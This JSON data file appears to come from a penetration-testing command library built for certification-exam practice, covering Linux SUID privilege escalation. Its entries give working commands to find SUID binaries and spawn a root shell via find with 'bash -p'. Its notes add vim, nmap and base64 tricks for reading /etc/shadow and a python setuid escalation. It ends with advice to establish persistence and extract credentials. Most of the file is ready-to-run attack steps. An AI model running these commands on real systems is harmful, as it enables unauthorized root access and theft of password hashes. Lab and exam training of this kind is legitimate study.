{
  "category": "post-exploit",
  "subcategory": "linux-suid",
  "description": "SUID binary exploitation commands for basic privilege escalation",
  "commands": [
    {
      "id": "find-suid-binaries",
      "name": "Find SUID Binaries",
      "category": "post-exploit",
      "subcategory": "linux-suid",
      "command": "find / -perm -4000 -type f 2>/dev/null",
      "description": "Locate all SUID binaries on filesystem (setuid bit allows execution with owner privileges)",
      "variables": [],
      "flag_explanations": {
        "/": "Start search from root directory (entire filesystem)",
        "-perm -4000": "Find files with SUID bit set (4 = SUID, represented in octal)",
        "-type f": "Only match regular files (not directories, symlinks, etc.)",
        "2>/dev/null": "Redirect stderr to /dev/null to suppress 'Permission denied' errors"
      },
      "tags": [
        "SUID",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "ENUMERATION",
        "pentest",
        "QUICK_WIN",
        "MANUAL"
      ],
      "success_indicators": [
        "List of SUID binaries displayed",
        "/usr/bin/find (example)",
        "/usr/bin/nmap (example)",
        "At least 10-20 system binaries found"
      ],
      "failure_indicators": [
        "Permission denied for all paths",
        "Empty output (unlikely on real system)",
        "find: command not found"
      ],
      "next_steps": [
        "filter-suid-binaries",
        "gtfobins-suid-lookup"
      ],
      "alternatives": [
        "linux-suid-find"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Empty results": "Try: find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null",
        "Permission denied everywhere": "You may not have execute permissions on directories - try specific paths"
      },
      "notes": "SUID bit allows file to execute with owner's privileges (usually root).\n\nMisconfigured SUID binaries are common certification privilege escalation vector."
    },
    {
      "id": "filter-suid-binaries",
      "name": "Filter Interesting SUID Binaries",
      "category": "post-exploit",
      "subcategory": "linux-suid",
      "command": "find / -perm -4000 -type f 2>/dev/null | grep -vE '(passwd|sudo|pkexec|polkit|mount|umount|su|ping|ping6|fusermount|newgrp|chsh|chfn|gpasswd)'",
      "description": "Filter out standard system SUID binaries and identify potentially exploitable ones",
      "variables": [],
      "flag_explanations": {
        "|": "Pipe output from find to grep filter",
        "grep -vE": "Invert match (-v) with extended regex (-E) to exclude patterns",
        "(pattern|pattern)": "Regex alternation - match any of these patterns"
      },
      "tags": [
        "SUID",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "ENUMERATION",
        "pentest",
        "FILTER",
        "MANUAL"
      ],
      "success_indicators": [
        "Shortened list of 1-10 binaries",
        "Uncommon binaries like find, vim, nmap, base64, python, perl",
        "Custom application binaries"
      ],
      "failure_indicators": [
        "Empty output (all filtered)",
        "Only standard system tools remain",
        "grep: command not found"
      ],
      "next_steps": [
        "gtfobins-suid-lookup"
      ],
      "alternatives": [],
      "prerequisites": [
        "find-suid-binaries"
      ],
      "troubleshooting": {
        "Everything filtered out": "Remove grep filter and manually review find output for unusual binaries",
        "grep not working": "Run find command alone and visually inspect for non-standard binaries"
      },
      "notes": "Standard system binaries (passwd, sudo, su) are SUID by design and rarely exploitable.\n\nFocus on:\nfind, vim, nmap, base64, less, more, python, perl, awk, tar, zip, gzip."
    },
    {
      "id": "gtfobins-suid-lookup",
      "name": "GTFOBins SUID Technique Lookup",
      "category": "post-exploit",
      "subcategory": "linux-suid",
      "command": "echo 'Visit: https://gtfobins.github.io/ and search for binary name. Look for SUID section.'",
      "description": "Manual step: Lookup exploitation technique for discovered SUID binary on GTFOBins website",
      "variables": [],
      "flag_explanations": {},
      "tags": [
        "SUID",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "GTFOBINS",
        "pentest",
        "MANUAL",
        "REFERENCE"
      ],
      "success_indicators": [
        "Binary has GTFOBins entry",
        "SUID section exists for binary",
        "Exploitation command documented"
      ],
      "failure_indicators": [
        "Binary not listed on GTFOBins",
        "No SUID section for binary",
        "Technique requires conditions not present"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [
        "filter-suid-binaries"
      ],
      "troubleshooting": {
        "Binary not on GTFOBins": "Try searchsploit or Google: '<binary-name> suid privilege escalation'",
        "No SUID section": "Check 'Shell' or 'File read' sections - may be adaptable"
      },
      "notes": "GTFOBins is curated list of Unix binaries that can be exploited for privilege escalation.\n\nSUID section shows commands that work when binary has setuid bit set.\n\nExample:\n/usr/bin/find .\n\n-exec /bin/bash -p \\; -quit"
    },
    {
      "id": "execute-suid-exploit-find",
      "name": "Execute SUID Exploitation (find example)",
      "category": "post-exploit",
      "subcategory": "linux-suid",
      "command": "/usr/bin/find . -exec /bin/bash -p \\; -quit",
      "description": "Exploit SUID find binary to spawn privileged bash shell",
      "variables": [],
      "flag_explanations": {
        "/usr/bin/find": "Full path to SUID find binary (replace with discovered path)",
        ".": "Search in current directory (required for find syntax)",
        "-exec": "Execute command for each file found",
        "/bin/bash -p": "Spawn bash with -p flag to preserve SUID privileges",
        "\\;": "Terminate -exec command (escaped semicolon)",
        "-quit": "Exit after first match (prevents multiple shell spawns)"
      },
      "tags": [
        "SUID",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "EXPLOITATION",
        "pentest",
        "FIND",
        "GTFOBINS"
      ],
      "success_indicators": [
        "Shell prompt changes to # (root indicator)",
        "whoami returns 'root'",
        "id shows uid=0 or euid=0",
        "Can access /root/ directory"
      ],
      "failure_indicators": [
        "Permission denied",
        "Binary not found",
        "Shell spawns but not privileged (forgot -p flag)",
        "SUID bit not set on binary"
      ],
      "next_steps": [
        "verify-root-access-suid"
      ],
      "alternatives": [
        "execute-suid-exploit-find",
        "execute-suid-exploit-find",
        "execute-sudo-exploit"
      ],
      "prerequisites": [
        "gtfobins-suid-lookup"
      ],
      "troubleshooting": {
        "Shell not privileged": "Ensure -p flag is used: /bin/bash -p (preserves SUID permissions)",
        "Binary not found": "Use full path from find output: $(which find) . -exec /bin/bash -p \\; -quit",
        "Permission denied": "Verify SUID bit: ls -la /usr/bin/find (should show -rwsr-xr-x)"
      },
      "notes": "The -p flag is CRITICAL for bash to preserve elevated permissions.\n\nWithout it, bash drops privileges.\n\nOther common SUID exploits:\nvim -c ':!/bin/bash -p', nmap --interactive then !sh, base64 /etc/shadow | base64 -d"
    },
    {
      "id": "verify-root-access-suid",
      "name": "Verify Root Privileges Obtained",
      "category": "post-exploit",
      "subcategory": "linux-suid",
      "command": "whoami && id && cat /etc/shadow > /dev/null 2>&1 && echo 'Root verified' || echo 'Not root'",
      "description": "Confirm effective UID is 0 (root) and can access root-only files",
      "variables": [],
      "flag_explanations": {
        "whoami": "Display current effective username (should be 'root')",
        "id": "Show user/group IDs (should show uid=0 or euid=0)",
        "cat /etc/shadow": "Attempt to read shadow file (only root can read)",
        "> /dev/null 2>&1": "Redirect output and errors to null (silent test)",
        "&&": "AND operator - run next command only if previous succeeded",
        "||": "OR operator - run if previous command failed"
      },
      "tags": [
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "VERIFICATION",
        "pentest",
        "ROOT",
        "POST_EXPLOITATION"
      ],
      "success_indicators": [
        "whoami outputs 'root'",
        "id shows uid=0(root) gid=0(root)",
        "id shows euid=0(root) egid=0(root)",
        "'Root verified' message displayed",
        "Can read /etc/shadow"
      ],
      "failure_indicators": [
        "whoami outputs non-root user",
        "uid is not 0",
        "Permission denied for /etc/shadow",
        "'Not root' message displayed"
      ],
      "next_steps": [],
      "alternatives": [
        "cat-etc-shadow"
      ],
      "prerequisites": [
        "execute-suid-exploit-find"
      ],
      "troubleshooting": {
        "euid is 0 but uid is not": "Still have root privileges (effective UID). Can escalate further with: python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "Cannot read /etc/shadow": "Privilege escalation failed. Ensure -p flag was used with bash: /bin/bash -p"
      },
      "notes": "Effective UID (euid) is what matters for permissions.\n\nEven if real UID (uid) is not 0, euid=0 grants root privileges.\n\ncertification exam:\nTake screenshot of whoami, id, and proof.txt contents for documentation.",
      "methodology_guidance": {
        "after_success": "Read root flag: cat /root/proof.txt Establish persistence Extract credentials: cat /etc/shadow"
      }
    }
  ]
}